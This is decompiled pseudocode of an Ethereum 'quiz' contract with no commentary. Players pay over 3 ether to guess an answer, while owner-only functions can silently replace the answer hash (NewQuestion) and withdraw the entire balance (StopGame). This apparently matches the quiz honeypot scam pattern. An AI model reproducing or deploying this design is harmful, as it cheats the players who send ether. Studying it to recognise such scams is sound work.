contract main {




// =====================  Runtime code  =====================


array of uint256 question;
address stor1;
uint256 stor1;
uint256 stor2;

function question() {
    return question[0 len question.length]
}

function _fallback() payable {
  stop
}

function newQuestioner(address arg1) {
    if msg.sender == address(stor1):
        address(stor1) = arg1
}

function NewQuestion(string arg1, bytes32 arg2) payable {
    if msg.sender == address(stor1):
        question[] = Array(len=arg1.length, data=arg1[all])
        stor2 = arg2
}

function StopGame() payable {
    require msg.sender == address(stor1)
    call msg.sender with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function Try(string arg1) payable {
    require tx.origin == msg.sender
    if stor2 == sha3(arg1[all]):
        if msg.value > 3 * 10^18:
            call msg.sender with:
               value eth.balance(this.address) wei
                 gas 2300 * is_zero(value) wei
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
}

function sub_03ab426a(?) payable {
    mem[ceil32(arg1.length) + 160 len arg2.length] = arg2[all]
    if not stor2:
        mem[ceil32(arg1.length) + ceil32(arg2.length) + 160 len floor32(arg2.length)] = call.data[arg2 + 36 len floor32(arg2.length)]
        mem[ceil32(arg1.length) + ceil32(arg2.length) + floor32(arg2.length) + 160] = 256^(-(arg2.length % 32) + 32) - 1 and mem[ceil32(arg1.length) + ceil32(arg2.length) + floor32(arg2.length) + 160] or call.data[arg2 + floor32(arg2.length) + 36 len arg2.length % 32], mem[ceil32(arg1.length) + arg2.length + 160 len -(arg2.length % 32) + 32] and !(256^(-(arg2.length % 32) + 32) - 1)
        stor2 = sha3(call.data[arg2 + 36 len floor32(arg2.length)], mem[ceil32(arg1.length) + ceil32(arg2.length) + floor32(arg2.length) + 160 len arg2.length % 32])
        question[] = Array(len=arg1.length, data=arg1[all])
        uint256(stor1) = msg.sender or Mask(96, 160, uint256(stor1))
}



}
